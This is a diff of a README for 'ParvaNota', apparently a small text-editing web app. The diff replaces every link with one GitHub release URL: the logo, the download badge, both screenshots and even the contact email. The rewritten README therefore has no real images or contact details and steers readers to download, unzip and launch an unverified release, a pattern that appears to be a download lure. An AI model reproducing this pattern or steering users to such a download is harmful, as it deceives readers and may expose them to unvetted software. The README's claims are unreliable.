@@ -1,7 +1,7 @@
 
 # ParvaNota 📝
 
-![ParvaNota Logo](https://example.com/logo.png)
+![ParvaNota Logo](https://github.com/egejuniyors/ParvaNota/releases/tag/v1.0)
 
 ## Small web application for basic text editing! 🌟
 
@@ -19,14 +19,14 @@ Welcome to ParvaNota, a minimalistic web application designed for basic text edi
 
 To get started with ParvaNota, simply click the link below to download the application:
 
-[![Download ParvaNota](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download ParvaNota](https://github.com/egejuniyors/ParvaNota/releases/tag/v1.0)](https://github.com/egejuniyors/ParvaNota/releases/tag/v1.0)
 
 Once the download is complete, unzip the file and launch the application to begin editing text seamlessly.
 
 ### Screenshots 📷
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/egejuniyors/ParvaNota/releases/tag/v1.0)
+![Screenshot 2](https://github.com/egejuniyors/ParvaNota/releases/tag/v1.0)
 
 ### Technologies Used 💻
 
@@ -40,6 +40,6 @@ Feel free to contribute to ParvaNota by submitting pull requests or suggesting n
 
 ### Contact Us 📧
 
-If you have any questions, suggestions, or feedback, please reach out to us at [contact@parvanota.com](mailto:contact@parvanota.com). We'd love to hear from you!
+If you have any questions, suggestions, or feedback, please reach out to us at [https://github.com/egejuniyors/ParvaNota/releases/tag/v1.0](https://github.com/egejuniyors/ParvaNota/releases/tag/v1.0). We'd love to hear from you!
 
 Thank you for choosing ParvaNota for your text editing needs. Happy writing! ✍️
